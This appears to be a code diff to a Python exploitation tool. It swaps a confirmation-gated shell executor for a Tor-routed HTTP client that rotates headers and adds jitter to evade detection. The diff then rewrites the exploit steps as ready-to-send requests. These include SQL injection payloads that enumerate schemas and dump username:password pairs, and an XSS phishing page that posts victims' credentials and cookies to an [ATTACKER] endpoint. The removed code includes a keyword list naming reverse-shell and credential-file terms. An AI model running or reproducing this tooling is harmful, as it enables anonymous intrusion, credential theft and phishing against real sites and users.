@@ -73,7 +73,9 @@ if not _VENV_PY.exists() and not _system_has_deps():
 
 import json, subprocess, shutil, secrets, signal, threading, time as _time_mod, shlex
 from decimal import Decimal, InvalidOperation
-from urllib.parse import urlparse, quote
+from urllib.parse import urlparse, quote, urlencode, urljoin
+from dataclasses import dataclass, field
+from typing import Callable
 
 # ── Shutdown signal handling ───────────────────────────────────────────────
 _shutdown_event = threading.Event()
@@ -748,141 +750,269 @@ class AuditTrail:
         self._start_time = 0
 
 
-# ── Safe Executor ──────────────────────────────────────────────────────────
+# ── Exploit Result ─────────────────────────────────────────────────────────
 
-class SafeExecutor:
-    """Command execution with safety confirmations, risk assessment,
-    rate limiting, and automatic timeout enforcement.
+@dataclass
+class ExploitResult:
+    """Structured result from an exploit step execution."""
+    success: bool = False
+    confidence: float = 0.0
+    evidence: str = ""
+    status_code: int = 0
+    response_body: str = ""
+    response_headers: dict = field(default_factory=dict)
+    error: str = ""
+    false_positive_risk: str = "unknown"
+    request_url: str = ""
+    request_method: str = "GET"
 
-    Risk levels determine the confirmation flow:
-    - LOW: single confirmation
-    - MEDIUM: single confirmation + warning
-    - HIGH: double confirmation + warning + delay
-    - CRITICAL: double confirmation + explicit warning + extended delay
+
+# ── Tor HTTP Client ────────────────────────────────────────────────────────
+
+_USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
+]
+
+
+class TorClient:
+    """HTTP client that routes all traffic through Tor SOCKS proxy.
+
+    Features:
+    - All requests through socks5h (DNS at proxy)
+    - User-Agent rotation per request
+    - Randomized Accept-Language and Sec-Fetch headers
+    - Per-request jitter delay (configurable via preset)
+    - Rate limiting
+    - Full request/response capture for audit trail
+    - Connection pooling via requests.Session
     """
 
-    RISK_COMMANDS = {
-        "reverse_shell": "CRITICAL",
-        "credential_dump": "CRITICAL",
-        "file_write": "HIGH",
-        "data_exfil": "HIGH",
-        "rce": "CRITICAL",
-        "sqli_extract": "HIGH",
-        "default": "MEDIUM",
-    }
-
-    def __init__(self, audit: AuditTrail):
+    def __init__(self, proxy_url: str, audit: AuditTrail,
+                 delay_lo: float = 1.0, delay_hi: float = 4.0,
+                 timeout: int = 30):
+        import requests as _req
+        self._session = _req.Session()
+        self._session.proxies = {"http": proxy_url, "https": proxy_url}
+        self._session.verify = True
         self._audit = audit
+        self._delay_lo = delay_lo
+        self._delay_hi = delay_hi
+        self._timeout = timeout
         self._exec_count = 0
         self._exec_times: list = []
-        self._rate_limit_window = 60
-        self._rate_limit_max = 20
         self._lock = threading.Lock()
 
-    def _assess_risk(self, command: str, step: dict) -> str:
-        """Assess the risk level of a command based on content analysis."""
-        cmd_lower = command.lower()
-        if any(k in cmd_lower for k in ("/dev/tcp", "reverse", "nc -", "ncat", "bash -i")):
-            return "CRITICAL"
-        if any(k in cmd_lower for k in ("password", "credential", "shadow", "id_rsa",
-                                         "security-credentials")):
-            return "HIGH"
-        if step.get("warning"):
-            return "HIGH"
-        if any(k in cmd_lower for k in ("union select", "group_concat", "information_schema")):
-            return "HIGH"
-        return step.get("risk", "MEDIUM")
+    def _rotate_headers(self) -> dict:
+        ua = secrets.choice(_USER_AGENTS)
+        langs = secrets.choice([
+            "en-US,en;q=0.5", "en-GB,en;q=0.5", "en-US,en;q=0.9",
+        ])
+        return {
+            "User-Agent": ua,
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+            "Accept-Language": langs,
+            "Accept-Encoding": "gzip, deflate, br",
+            "Connection": "keep-alive",
+            "Upgrade-Insecure-Requests": "1",
+            "Sec-Fetch-Dest": "document",
+            "Sec-Fetch-Mode": "navigate",
+            "Sec-Fetch-Site": secrets.choice(["none", "same-origin", "cross-site"]),
+            "Sec-Fetch-User": "?1",
+        }
 
     def _check_rate_limit(self) -> bool:
-        """Enforce rate limiting on command executions."""
         now = _time_mod.time()
         with self._lock:
             self._exec_times = [t for t in self._exec_times
-                                if now - t < self._rate_limit_window]
-            if len(self._exec_times) >= self._rate_limit_max:
+                                if now - t < 60]
+            if len(self._exec_times) >= 20:
                 return False
             self._exec_times.append(now)
             self._exec_count += 1
         return True
 
-    def execute(self, command: str, step: dict, vuln_type: str = "",
-                timeout: int = 30) -> Optional[subprocess.CompletedProcess]:
-        """Execute a command with full safety pipeline.
-
-        Returns the CompletedProcess result or None if aborted/failed.
-        """
-        risk = self._assess_risk(command, step)
+    def request(self, method: str, url: str,
+                params: dict = None, data: str = None,
+                headers: dict = None, timeout: int = None,
+                allow_redirects: bool = True) -> ExploitResult:
+        """Execute an HTTP request through Tor with full OPSEC."""
+        import requests as _req
 
         if not self._check_rate_limit():
-            warn(f"Rate limit reached ({self._rate_limit_max} commands/"
-                 f"{self._rate_limit_window}s). Wait before executing more.")
-            return None
+            _time_mod.sleep(5)
+            with self._lock:
+                self._exec_times.clear()
 
-        if risk == "CRITICAL":
-            print(f"  {R}{'=' * 50}{N}")
-            print(f"  {R}CRITICAL RISK: This action could be dangerous{N}")
-            print(f"  {R}{'=' * 50}{N}")
-            if step.get("warning"):
-                print(f"  {R}Detail: {step['warning']}{N}")
-            print()
-            if not confirm("FIRST CONFIRMATION: Understand the risks?"):
-                info("Aborted.")
-                self._audit.log("abort", f"critical_risk_rejected: {command[:40]}", risk=risk)
-                return None
-            _jittered_delay(1.0, 4.0)
-            if not confirm("SECOND CONFIRMATION: Execute this critical command?"):
-                info("Aborted.")
-                self._audit.log("abort", f"critical_risk_rejected_2nd: {command[:40]}", risk=risk)
-                return None
-        elif risk == "HIGH":
-            if step.get("warning"):
-                print(f"  {Y}WARNING: {step['warning']}{N}")
-            if not confirm(f"Execute this HIGH-risk command?"):
-                info("Aborted.")
-                self._audit.log("abort", f"high_risk_rejected: {command[:40]}", risk=risk)
-                return None
-            _jittered_delay(0.5, 3.0)
-        else:
-            if not confirm("CONFIRM: Execute this command through Tor?"):
-                info("Aborted.")
-                return None
+        _jittered_delay(self._delay_lo, self._delay_hi)
 
-        _jittered_delay(1.0, 5.0)
+        req_headers = self._rotate_headers()
+        if headers:
+            req_headers.update(headers)
+
+        result = ExploitResult(
+            request_url=url[:200],
+            request_method=method,
+        )
 
         try:
-            result = subprocess.run(
-                ["bash", "--norc", "--noprofile", "-c", command],
-                capture_output=True, text=True, timeout=timeout,
-                env=_sanitized_env(),
+            resp = self._session.request(
+                method=method, url=url, params=params, data=data,
+                headers=req_headers, timeout=timeout or self._timeout,
+                allow_redirects=allow_redirects,
             )
-            if result.stdout:
-                print(f"\n  {G}Output:{N}")
-                for line in result.stdout.strip().split("\n")[:20]:
-                    print(f"    {line}")
-            if result.stderr:
-                print(f"\n  {Y}Stderr:{N}")
-                for line in result.stderr.strip().split("\n")[:5]:
-                    print(f"    {line}")
+            result.status_code = resp.status_code
+            result.response_body = resp.text[:50000]
+            result.response_headers = dict(resp.headers)
 
-            self._audit.log_execution(
-                command[:60], vuln_type,
-                exit_code=result.returncode, risk=risk,
+            self._audit.log(
+                action="http_request",
+                detail=f"{method} {url[:60]} -> {resp.status_code}",
+                vuln_type="",
+                success=200 <= resp.status_code < 400,
             )
-            ok(f"Executed (exit code: {result.returncode})")
             return result
 
-        except subprocess.TimeoutExpired:
-            warn(f"Command timed out ({timeout}s)")
-            self._audit.log_execution(command[:60], vuln_type, exit_code=-1, risk=risk)
-            return None
+        except _req.exceptions.Timeout:
+            result.error = "timeout"
+            self._audit.log(action="http_timeout", detail=f"{method} {url[:60]}")
+            return result
+        except _req.exceptions.ConnectionError as e:
+            result.error = f"connection_error: {type(e).__name__}"
+            self._audit.log(action="http_error", detail=f"{method} {url[:60]}: {type(e).__name__}")
+            return result
         except Exception as e:
-            err(f"Execution failed: {type(e).__name__}")
-            self._audit.log_execution(command[:60], vuln_type, exit_code=-1, risk=risk)
-            return None
+            result.error = f"{type(e).__name__}: {str(e)[:100]}"
+            self._audit.log(action="http_error", detail=f"{method} {url[:60]}: {type(e).__name__}")
+            return result
+
+    def get(self, url: str, params: dict = None, **kw) -> ExploitResult:
+        return self.request("GET", url, params=params, **kw)
+
+    def post(self, url: str, data: str = None, **kw) -> ExploitResult:
+        return self.request("POST", url, data=data, **kw)
+
+    def head(self, url: str, **kw) -> ExploitResult:
+        return self.request("HEAD", url, **kw)
 
     @property
     def execution_count(self) -> int:
         return self._exec_count
+
+    def close(self):
+        try:
+            self._session.close()
+        except Exception:
+            pass
+
+
+# ── Step Executor ──────────────────────────────────────────────────────────
+
+class StepExecutor:
+    """Executes exploit steps using TorClient with structured validation.
+
+    Replaces the old bash -c / curl string approach. Each step is either:
+    - An HTTP request (method + url + params/data + validate callback)
+    - A file generation step
+    - An informational step
+
+    Risk assessment and confirmation flow preserved from SafeExecutor.
+    """
+
+    def __init__(self, client: TorClient, audit: AuditTrail):
+        self._client = client
+        self._audit = audit
+
+    def execute_step(self, step: dict, vuln_type: str = "") -> Optional[ExploitResult]:
+        """Execute a single exploit step. Returns ExploitResult or None if aborted."""
+        risk = step.get("risk", "MEDIUM")
+        if step.get("warning") and risk not in ("HIGH", "CRITICAL"):
+            risk = "HIGH"
+
+        if risk == "CRITICAL":
+            print(f"  {R}{'=' * 50}{N}")
+            print(f"  {R}CRITICAL RISK: {step.get('warning', 'Dangerous action')}{N}")
+            print(f"  {R}{'=' * 50}{N}")
+            if not confirm("FIRST CONFIRMATION: Understand the risks?"):
+                self._audit.log("abort", f"rejected: {step.get('title', '')[:40]}", risk=risk)
+                return None
+            _jittered_delay(1.0, 4.0)
+            if not confirm("SECOND CONFIRMATION: Execute?"):
+                self._audit.log("abort", f"rejected_2nd: {step.get('title', '')[:40]}", risk=risk)
+                return None
+        elif risk == "HIGH":
+            if step.get("warning"):
+                print(f"  {Y}WARNING: {step['warning']}{N}")
+            if not confirm("Execute this HIGH-risk step?"):
+                self._audit.log("abort", f"rejected: {step.get('title', '')[:40]}", risk=risk)
+                return None
+        else:
+            if not confirm("Execute through Tor?"):
+                return None
+
+        req = step.get("request")
+        if not req:
+            return None
+
+        method = req.get("method", "GET")
+        url = req.get("url", "")
+        params = req.get("params")
+        data = req.get("data")
+        headers = req.get("headers")
+
+        if not url:
+            err("No URL in step request")
+            return None
+
+        # Validate URL before sending
+        parsed = urlparse(url)
+        if parsed.scheme not in ("http", "https"):
+            err(f"Invalid scheme: {parsed.scheme}")
+            return None
+        if not parsed.netloc:
+            err("No host in URL")
+            return None
+
+        info(f"{method} {url[:70]}...")
+        result = self._client.request(
+            method=method, url=url, params=params, data=data,
+            headers=headers,
+        )
+
+        # Run validation callback if provided
+        validate = step.get("validate")
+        if validate and callable(validate):
+            try:
+                validate(result)
+            except Exception:
+                pass
+
+        # Display result
+        if result.error:
+            err(f"Request failed: {result.error}")
+        else:
+            status_color = G if 200 <= result.status_code < 400 else Y
+            print(f"  {status_color}HTTP {result.status_code}{N} "
+                  f"({len(result.response_body)} bytes)")
+            if result.response_body and len(result.response_body) < 2000:
+                body_preview = result.response_body.strip()[:500]
+                if body_preview:
+                    print(f"  {D}Response:{N}")
+                    for line in body_preview.split("\n")[:10]:
+                        print(f"    {line[:120]}")
+
+        self._audit.log(
+            action="exploit_step",
+            detail=f"{method} {url[:60]} -> {result.status_code} "
+                   f"conf={result.confidence:.0%}",
+            risk=risk, vuln_type=vuln_type,
+            success=result.success,
+        )
+
+        return result
 
 
 # ── Report Generator ───────────────────────────────────────────────────────
@@ -1844,24 +1974,30 @@ def _intel_exploit_walkthrough(tor_proxy: str, auto_mode: bool = False):
 
     file_mgr = ExploitFileManager(ttl_seconds=600)
     audit = AuditTrail()
-    executor = SafeExecutor(audit)
     server = ExploitServer(file_mgr)
+    # TorClient + StepExecutor created after preset selection (needs delay config)
 
+    _client = None
+    _executor = None
     try:
-        _walkthrough_main(exploitable, vulns, tor_proxy, auto_mode,
-                          file_mgr, audit, executor, server)
+        _client, _executor = _walkthrough_main(
+            exploitable, vulns, tor_proxy, auto_mode,
+            file_mgr, audit, server)
     except (KeyboardInterrupt, EOFError):
         print()
         warn("Interrupted — cleaning up...")
     except Exception as _e:
         err(f"Walkthrough error: {type(_e).__name__}: {_e}")
     finally:
-        _walkthrough_cleanup(file_mgr, audit, executor, server)
+        if _client:
+            _client.close()
+        _walkthrough_cleanup(file_mgr, audit, _executor, server)
 
 
 def _walkthrough_main(exploitable, vulns, tor_proxy, auto_mode,
-                      file_mgr, audit, executor, server):
-    """Core walkthrough logic, wrapped in try/finally by caller."""
+                      file_mgr, audit, server):
+    """Core walkthrough logic, wrapped in try/finally by caller.
+    Returns (TorClient, StepExecutor) for cleanup."""
 
     if file_mgr.disk_warning:
         print(f"  {R}WARNING: /dev/shm not available — files stored on disk, not RAM.{N}")
@@ -1888,6 +2024,13 @@ def _walkthrough_main(exploitable, vulns, tor_proxy, auto_mode,
     print()
     preset_name = prompt("Preset", "balanced").lower()
     preset = _WALKTHROUGH_PRESETS.get(preset_name, _WALKTHROUGH_PRESETS["balanced"])
+    client = TorClient(
+        proxy_url=tor_proxy, audit=audit,
+        delay_lo=preset["delay_lo"], delay_hi=preset["delay_hi"],
+        timeout=preset["timeout"],
+    )
+    executor = StepExecutor(client, audit)
+
     ok(f"Preset: {preset['label']} (timeout={preset['timeout']}s, "
        f"delays={preset['delay_lo']}-{preset['delay_hi']}s)")
     print()
@@ -2004,6 +2147,8 @@ def _walkthrough_main(exploitable, vulns, tor_proxy, auto_mode,
     _walkthrough_session_end(file_mgr, audit, executor, findings_summary,
                              server)
 
+    return client, executor
+
 
 def _pre_generate_all_files(exploitable, base_url, sp, attacker_url,
                             file_mgr, server, audit):
@@ -2048,7 +2193,7 @@ def _pre_generate_all_files(exploitable, base_url, sp, attacker_url,
 
 
 def _run_steps_smart(steps: list, etype: str, test_url: str,
-                     vi: int, executor: SafeExecutor,
+                     vi: int, executor: StepExecutor,
                      file_mgr: ExploitFileManager,
                      server: ExploitServer, audit: AuditTrail,
                      chain_data: dict, attacker_url: str,
@@ -2126,39 +2271,51 @@ def _run_steps_smart(steps: list, etype: str, test_url: str,
             step_idx += 1
             continue
 
-        # ── Command steps ──
-        cmd = step.get("command", "")
-
-        # Apply chain_data substitutions
-        cmd = _subst_attacker(cmd, attacker_url)
-        cmd = cmd.replace("[TARGET_URL]", test_url)
-        for key, val in chain_data.items():
-            placeholder = f"[{key.upper()}]"
-            if placeholder in cmd:
-                cmd = cmd.replace(placeholder, str(val))
-
-        is_info = cmd.startswith("#") or cmd.startswith("<!--")
-
-        print(f"  {G}Step {step_num}/{len(steps)}{N}: {B}{step_title}{N}")
-        if step.get("warning"):
-            print(f"  {R}WARNING: {step['warning']}{N}")
-        if not is_info:
-            print(f"  {D}Command:{N}")
-            for cmd_line in cmd.split("\n"):
-                print(f"    {C}{cmd_line}{N}")
-        if step.get("note"):
-            print(f"  {D}Note: {step['note']}{N}")
-        print()
-
-        if is_info:
+        # ── Request-based steps ──
+        req = step.get("request")
+        if not req:
             info(f"Info: {step.get('note', step_title)}")
             audit.log("info_step", step_title, vuln_type=etype)
             step_idx += 1
             continue
 
+        # Apply chain_data + attacker substitutions to the URL
+        url = req.get("url", "")
+        url = _subst_attacker(url, attacker_url)
+        url = url.replace("[TARGET_URL]", test_url)
+        for key, val in chain_data.items():
+            placeholder = f"[{key.upper()}]"
+            if placeholder in url:
+                url = url.replace(placeholder, str(val)[:200])
+        req["url"] = url
+
+        # Apply substitutions to params too
+        if req.get("params"):
+            for pk, pv in req["params"].items():
+                pv = _subst_attacker(str(pv), attacker_url)
+                for key, val in chain_data.items():
+                    placeholder = f"[{key.upper()}]"
+                    if placeholder in pv:
+                        pv = pv.replace(placeholder, str(val)[:200])
+                req["params"][pk] = pv
+
+        if req.get("data"):
+            req["data"] = _subst_attacker(str(req["data"]), attacker_url)
+
+        print(f"  {G}Step {step_num}/{len(steps)}{N}: {B}{step_title}{N}")
+        if step.get("warning"):
+            print(f"  {R}WARNING: {step['warning']}{N}")
+        method = req.get("method", "GET")
+        print(f"  {D}{method} {url[:80]}{N}")
+        if req.get("params"):
+            print(f"  {D}Params: {req['params']}{N}")
+        if step.get("note"):
+            print(f"  {D}Note: {step['note']}{N}")
+        print()
+
         while True:
             default_action = "r"
-            print(f"    {G}r{N}=run  {G}e{N}=edit+run  {G}s{N}=skip  "
+            print(f"    {G}r{N}=run  {G}s{N}=skip  "
                   f"{G}n{N}=next finding  {G}d{N}=files  "
                   f"{G}a{N}=audit  {G}q{N}=quit")
             action = prompt(f"  Step {step_num}", default_action).lower()
@@ -2169,7 +2326,7 @@ def _run_steps_smart(steps: list, etype: str, test_url: str,
 
             if action in ("n", "next"):
                 audit.log_skip(f"finding_{vi+1}_remaining_steps", etype)
-                step_idx = len(steps)  # exit outer loop
+                step_idx = len(steps)
                 break
 
             if action in ("s", "skip"):
@@ -2189,39 +2346,19 @@ def _run_steps_smart(steps: list, etype: str, test_url: str,
                 continue
 
             if action in ("r", "run"):
-                _jittered_delay(preset["delay_lo"], preset["delay_hi"])
-                result = executor.execute(cmd, step, vuln_type=etype,
-                                          timeout=preset["timeout"])
-                if result and result.stdout:
-                    output = result.stdout.strip()
-                    chain_data["last_output"] = output
-                    chain_data[f"{etype}_output_{step_idx}"] = output
-                    _auto_extract_chain_data(output, etype, chain_data)
-
-                if result is not None:
-                    ok(f"Step {step_num} complete")
+                result = executor.execute_step(step, vuln_type=etype)
+                if result:
+                    chain_data["last_output"] = result.response_body[:5000]
+                    chain_data[f"{etype}_output_{step_idx}"] = result.response_body[:2000]
+                    chain_data["last_status"] = str(result.status_code)
+                    _auto_extract_chain_data(result.response_body, etype, chain_data)
+                    if result.success:
+                        ok(f"Step {step_num}: {result.evidence}")
+                    elif result.error:
+                        err(f"Step {step_num}: {result.error}")
+                    else:
+                        info(f"Step {step_num}: {result.evidence or 'Check output'}")
                 print()
-                step_idx += 1
-                break
-
-            if action in ("e", "edit"):
-                default_cmd = cmd.split("\n")[0]
-                custom = prompt("Enter command to execute", default_cmd)
-                if not custom or custom.startswith("#"):
-                    info("No executable command entered — skipping step")
-                    audit.log_skip(f"edit_empty:{step_title}", etype)
-                    step_idx += 1
-                    break
-                if not confirm(f"Execute: {custom[:80]}... ?"):
-                    continue
-
-                audit.log_edit_run(custom[:60], etype)
-                result = executor.execute(custom, step, vuln_type=etype,
-                                          timeout=preset["timeout"])
-                if result and result.stdout:
-                    chain_data["last_output"] = result.stdout.strip()
-                    _auto_extract_chain_data(result.stdout.strip(), etype,
-                                            chain_data)
                 step_idx += 1
                 break
 
@@ -2314,7 +2451,7 @@ def _show_live_audit(audit: AuditTrail):
 
 def _walkthrough_session_end(file_mgr: ExploitFileManager,
                              audit: AuditTrail,
-                             executor: SafeExecutor,
+                             executor,
                              findings_summary: list,
                              server: ExploitServer = None):
     """End-of-session: show stats, offer report, then wipe everything."""
@@ -2379,7 +2516,7 @@ def _walkthrough_session_end(file_mgr: ExploitFileManager,
 
 def _walkthrough_cleanup(file_mgr: ExploitFileManager,
                          audit: AuditTrail,
-                         executor: SafeExecutor,
+                         executor=None,
                          server: ExploitServer = None):
     """Securely destroy all session data — files, server, audit, memory."""
     print()
@@ -2405,98 +2542,130 @@ def _walkthrough_cleanup(file_mgr: ExploitFileManager,
 
 def _build_exploit_steps(etype: str, param: str, ei: dict,
                          test_url: str, base_url: str, sp: str) -> list:
-    """Build production-grade exploit steps with functional payloads.
+    """Build exploit steps as structured request dicts with validation.
 
-    Every command is URL-encoded where needed and ready to execute.
-    Generated HTML files are functional exploits, not documentation.
+    Each step has:
+    - title, note, warning, risk (display)
+    - request: {method, url, params, data, headers} (execution)
+    - validate: callable(ExploitResult) that sets success/confidence/evidence
+    - generate_file: {filename, content, note} (file generation)
+    - OR command: str (legacy shell command for edge cases only)
+
+    Validation callbacks analyze the response and set structured results.
     """
     target = test_url if test_url and test_url != "[TARGET]" else base_url
     path = ei.get("path", "")
     target_base = target.split("?")[0] if "?" in target else target
 
-    def _curl(url: str, extra: str = "") -> str:
-        """Build a shell-safe curl command."""
-        parts = [f"curl -s {sp}"]
-        if extra:
-            parts.append(extra)
-        parts.append(shlex.quote(url))
-        return " ".join(parts)
+    import re as _re
 
-    def _curl_param(val: str, extra: str = "") -> str:
-        """Build curl with param=val appended to target_base."""
-        return _curl(f"{target_base}?{param}={val}", extra)
+    def _get(url: str, extra_params: dict = None, extra_headers: dict = None) -> dict:
+        """Build a GET request dict."""
+        r = {"method": "GET", "url": url}
+        if extra_params:
+            r["params"] = extra_params
+        if extra_headers:
+            r["headers"] = extra_headers
+        return r
+
+    def _get_param(val: str) -> dict:
+        """Build GET to target_base with param=val."""
+        return _get(target_base, extra_params={param: val})
+
+    def _post(url: str, data: dict = None, extra_headers: dict = None) -> dict:
+        r = {"method": "POST", "url": url}
+        if data:
+            r["data"] = urlencode(data)
+            r["headers"] = {"Content-Type": "application/x-www-form-urlencoded"}
+            if extra_headers:
+                r["headers"].update(extra_headers)
+        elif extra_headers:
+            r["headers"] = extra_headers
+        return r
+
+    _SQL_ERRORS = _re.compile(
+        r"(SQL syntax|mysql_fetch|ORA-\d|SQLSTATE|sqlite3\.|"
+        r"pg_query|Unclosed quotation|quoted string not properly terminated|"
+        r"error in your SQL|syntax error at or near|"
+        r"Microsoft OLE DB|ODBC SQL Server Driver)", _re.I)
 
     steps = []
 
     if etype == "sqli":
-        _q = quote
-        _p_ver = _q("' UNION SELECT version()-- -")
-        _p_sqlite = _q("' UNION SELECT sqlite_version()-- -")
-        _p_orderby = _q("' ORDER BY ")
-        _p_tail = _q("-- -")
-        _p_dbs = _q("' UNION SELECT group_concat(schema_name) FROM information_schema.schemata-- -")
-        _p_tbls = _q("' UNION SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()-- -")
-        _p_cols = _q("' UNION SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='users'-- -")
-        _p_dump = _q("' UNION SELECT group_concat(username,0x3a,password) FROM users-- -")
-        _p_true = _q("' AND 1=1-- -")
-        _p_false = _q("' AND 1=2-- -")
-        _p_sleep = _q("' AND SLEEP(5)-- -")
+        def _sqli_error_check(r: ExploitResult):
+            if _SQL_ERRORS.search(r.response_body):
+                r.success = True
+                r.confidence = 0.8
+                r.evidence = "SQL error message in response"
+                r.false_positive_risk = "low"
+            elif r.status_code == 500:
+                r.confidence = 0.4
+                r.evidence = "HTTP 500 — possible SQL error"
+                r.false_positive_risk = "medium"
+
+        def _sqli_data_check(r: ExploitResult):
+            body = r.response_body
+            if any(s in body for s in ("root:x:0", "information_schema", ":")):
+                r.success = True
+                r.confidence = 0.9
+                r.evidence = f"Data extracted ({len(body)} bytes)"
+                r.false_positive_risk = "low"
+            elif r.status_code == 200 and len(body) > 50:
+                r.confidence = 0.5
+                r.evidence = "Got response data — verify manually"
+                r.false_positive_risk = "medium"
+
+        def _sqli_blind_check(r: ExploitResult):
+            r.evidence = f"Response: {len(r.response_body)} bytes, HTTP {r.status_code}"
+            if r.status_code == 200:
+                r.confidence = 0.3
+
         steps = [
             {"title": "Confirm injection (error-based)",
-             "command": _curl(target),
-             "note": "Look for SQL error messages in the response body"},
-            {"title": "Detect DB engine",
-             "command": (
-                 f"echo '--- MySQL/Maria ---' && {_curl_param(_p_ver)} && "
-                 f"echo '--- SQLite ---' && {_curl_param(_p_sqlite)}"
-             ),
-             "note": "Version string identifies the backend engine"},
-            {"title": "Find column count",
-             "command": (
-                 f"for i in $(seq 1 15); do "
-                 f"CODE=$(curl -s -o /dev/null -w '%{{http_code}}' {sp} "
-                 f"{shlex.quote(target_base + '?' + param + '=' + _p_orderby)}\"$i\"{shlex.quote(_p_tail)}); "
-                 f"echo \"ORDER BY $i -> HTTP $CODE\"; done"
-             ),
-             "note": "Last 200 = N columns. First error = N+1."},
-            {"title": "UNION version extraction",
-             "command": _curl_param(_p_ver),
-             "note": "Confirms UNION. Shows DB version."},
+             "request": _get(target),
+             "validate": _sqli_error_check,
+             "note": "Checking for SQL error messages in response"},
+            {"title": "Extract DB version (MySQL)",
+             "request": _get_param("' UNION SELECT version()-- -"),
+             "validate": _sqli_data_check,
+             "note": "UNION-based version extraction"},
+            {"title": "Extract DB version (SQLite)",
+             "request": _get_param("' UNION SELECT sqlite_version()-- -"),
+             "validate": _sqli_data_check,
+             "note": "SQLite version extraction"},
             {"title": "Enumerate databases",
-             "command": _curl_param(_p_dbs),
+             "request": _get_param("' UNION SELECT group_concat(schema_name) FROM information_schema.schemata-- -"),
+             "validate": _sqli_data_check,
              "warning": "Reads all database names"},
             {"title": "Enumerate tables",
-             "command": _curl_param(_p_tbls),
-             "warning": "Lists every table in current database"},
-            {"title": "Enumerate columns (users)",
-             "command": _curl_param(_p_cols),
+             "request": _get_param("' UNION SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()-- -"),
+             "validate": _sqli_data_check,
+             "warning": "Lists tables in current database"},
+            {"title": "Enumerate columns (users table)",
+             "request": _get_param("' UNION SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='users'-- -"),
+             "validate": _sqli_data_check,
              "warning": "Maps user table structure"},
             {"title": "Dump credentials",
-             "command": _curl_param(_p_dump),
+             "request": _get_param("' UNION SELECT group_concat(username,0x3a,password) FROM users-- -"),
+             "validate": _sqli_data_check,
              "warning": "Extracts username:password pairs",
              "risk": "HIGH"},
-            {"title": "Blind boolean test",
-             "command": (
-                 f"TRUE=$({_curl_param(_p_true)} | wc -c) && "
-                 f"FALSE=$({_curl_param(_p_false)} | wc -c) && "
-                 f"echo \"TRUE=$TRUE FALSE=$FALSE\" && "
-                 f"[ \"$TRUE\" != \"$FALSE\" ] && echo 'BLIND CONFIRMED' || echo 'Same size'"
-             ),
-             "note": "Automated true/false comparison"},
-            {"title": "Time-based blind test",
-             "command": (
-                 f"START=$(date +%s) && {_curl_param(_p_sleep)} > /dev/null && "
-                 f"END=$(date +%s) && DIFF=$((END-START)) && "
-                 f"echo \"Delay: ${{DIFF}}s\" && "
-                 f"[ $DIFF -ge 4 ] && echo 'TIME-BASED CONFIRMED' || echo 'No delay'"
-             ),
-             "note": "Automated timing comparison"},
+            {"title": "Blind boolean test (TRUE)",
+             "request": _get_param("' AND 1=1-- -"),
+             "validate": _sqli_blind_check,
+             "note": "Compare this response size with FALSE test"},
+            {"title": "Blind boolean test (FALSE)",
+             "request": _get_param("' AND 1=2-- -"),
+             "validate": _sqli_blind_check,
+             "note": "Different size from TRUE = blind SQLi confirmed"},
+            {"title": "Time-based blind (SLEEP 5)",
+             "request": _get_param("' AND SLEEP(5)-- -"),
+             "validate": lambda r: setattr(r, 'evidence', f"Check response time manually"),
+             "note": "Response > 5s = time-based blind confirmed"},
         ]
 
     elif etype == "xss":
         marker = f"x{secrets.token_hex(4)}"
-        q = quote
-        # Functional phishing page that replaces the DOM with a fake login
         xss_phish_html = (
             f"<!DOCTYPE html><html><head><meta charset='utf-8'>"
             f"<title>Session Expired</title>"
@@ -2528,319 +2697,272 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
             f"document.getElementById('pf').addEventListener('submit',function(e){{"
             f"e.preventDefault();"
             f"var d=new FormData(this);"
-            f"fetch('[ATTACKER]/c',{{method:'POST',body:JSON.stringify({{email:d.get('email'),pass:d.get('pass'),url:location.href,cookies:document.cookie}})}}).finally(function(){{"
+            f"fetch('[ATTACKER]/c',{{method:'POST',headers:{{'Content-Type':'application/json'}},"
+            f"body:JSON.stringify({{email:d.get('email'),pass:d.get('pass'),url:location.href,"
+            f"cookies:document.cookie}})}}).finally(function(){{"
             f"location.href='{base_url}';}});}});"
             f"</script></body></html>"
         )
-        _xp_script = quote("<script>alert(1)</script>")
-        _xp_img = quote("<img src=x onerror=alert(1)>")
-        _xp_svg = quote("<svg/onload=alert(1)>")
-        _xp_attr = quote("\" onfocus=alert(1) autofocus=\"")
-        _xp_cookie = quote("<script>new Image().src='[ATTACKER]/c?c='+document.cookie</script>")
-        _xp_full = quote("<script>fetch('[ATTACKER]/s',{method:'POST',body:JSON.stringify({c:document.cookie,u:location.href,ls:JSON.stringify(localStorage)})})</script>")
+
+        def _xss_reflect_check(payload_str: str):
+            def _check(r: ExploitResult):
+                if payload_str in r.response_body:
+                    r.success = True
+                    r.confidence = 0.9
+                    r.evidence = f"Payload reflected unescaped in response"
+                    r.false_positive_risk = "low"
+                elif r.status_code == 200:
+                    r.confidence = 0.2
+                    r.evidence = "Got 200 but payload not found in body"
+                    r.false_positive_risk = "high"
+            return _check
+
         steps = [
             {"title": "Check reflection (marker injection)",
-             "command": f"{_curl_param(marker)} | grep -c '{marker}'",
-             "note": f"Count > 0 = input reflected. Marker: {marker}"},
-            {"title": "Test script tag",
-             "command": _curl_param(_xp_script),
-             "note": "Check if <script> appears unescaped in response body"},
+             "request": _get_param(marker),
+             "validate": _xss_reflect_check(marker),
+             "note": f"Marker: {marker} — checking if input is reflected"},
+            {"title": "Test <script> tag",
+             "request": _get_param("<script>alert(1)</script>"),
+             "validate": _xss_reflect_check("<script>"),
+             "note": "Check if script tag appears unescaped"},
             {"title": "Test img onerror (filter bypass)",
-             "command": _curl_param(_xp_img),
+             "request": _get_param("<img src=x onerror=alert(1)>"),
